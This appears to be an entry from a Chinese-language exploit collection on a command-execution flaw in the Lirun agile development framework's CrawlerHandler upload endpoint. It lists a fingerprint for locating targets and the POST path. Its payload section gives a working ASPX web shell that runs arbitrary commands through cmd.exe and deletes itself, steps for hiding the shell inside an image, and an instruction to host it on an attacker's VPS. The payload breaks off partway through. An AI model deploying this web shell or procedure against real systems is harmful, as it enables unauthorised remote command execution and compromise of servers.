# 力软信息敏捷开发框架CrawlerHandler存在远程上传导致命令执行漏洞

- **系统**：力软信息敏捷开发框架　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="Home/AccordionIndex"`
- **请求**：`POST /Utility/CrawlerHandler HTTP/1.1`

**请求体 / payload**
```
构建图片马
copy 1.jpg/b+1.aspx/a test.jpg
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
生成完成后
上传至vps并开启http服务
Host:
Conten…（脚本共 783 字，完整版见原文）
```
- **预期**：200　|　—